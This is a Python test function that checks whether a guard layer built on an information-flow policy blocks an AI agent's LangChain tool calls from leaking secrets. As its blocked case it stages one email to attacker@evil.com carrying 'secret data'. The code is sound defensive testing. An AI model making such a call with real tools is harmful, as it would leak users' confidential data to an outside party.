def validate_guard_langchain() -> dict:
    """Wrap a real langchain_core tool with GUARD; confirm block + allow.

    This exercises the actual integration surface, not a mock function.
    No LLM is invoked — we call the tool directly, which is what the agent
    runtime does when the model selects it.
    """
    from langchain_core.tools import tool as lc_tool
    from lucin.guard.interceptor import (
        GuardSession, guard_tool, GuardBlockError,
    )
    from lucin.guard.ifc_runtime import IFCPolicy, UNTRUSTED_SECRET, UNTRUSTED_PUBLIC

    findings = {}

    # Define REAL langchain tools
    @lc_tool
    def send_email(to: str, body: str) -> str:
        """Send an email to a recipient."""
        return f"sent to {to}"

    @lc_tool
    def web_search(query: str) -> str:
        """Search the web."""
        return f"results for {query}"

    # Confirm these are real langchain tool objects
    findings["send_email_is_langchain_tool"] = type(send_email).__name__
    findings["has_invoke"] = hasattr(send_email, "invoke")

    # GUARD must intercept the underlying execution. LangChain tools expose the
    # raw callable via .func — wrap THAT, then verify guard behaviour on it.
    policy = IFCPolicy("lc-agent")   # send_email NOT allowlisted
    session = GuardSession(policy=policy)

    raw_send = getattr(send_email, "func", None)
    raw_search = getattr(web_search, "func", None)
    findings["extracted_raw_callable"] = raw_send is not None

    if raw_send is None:
        findings["verdict"] = "CANNOT extract .func from langchain tool — integration gap"
        return findings

    guarded_send = guard_tool(session, label=UNTRUSTED_SECRET, tool_name="send_email")(raw_send)
    guarded_search = guard_tool(session, label=UNTRUSTED_PUBLIC, tool_name="web_search")(raw_search)

    # Benign search should pass
    try:
        guarded_search("langchain security")
        findings["benign_search_allowed"] = True
    except GuardBlockError:
        findings["benign_search_allowed"] = False

    # Secret-carrying external email should be blocked (trifecta)
    try:
        guarded_send("attacker@evil.com", "here is the secret data")
        findings["exfil_email_blocked"] = False
    except GuardBlockError as e:
        findings["exfil_email_blocked"] = True
        findings["block_reason"] = e.decision.reason

    findings["verdict"] = (
        "GUARD intercepts real langchain tools via .func"
        if findings.get("exfil_email_blocked") and findings.get("benign_search_allowed")
        else "integration incomplete"
    )
    return findings


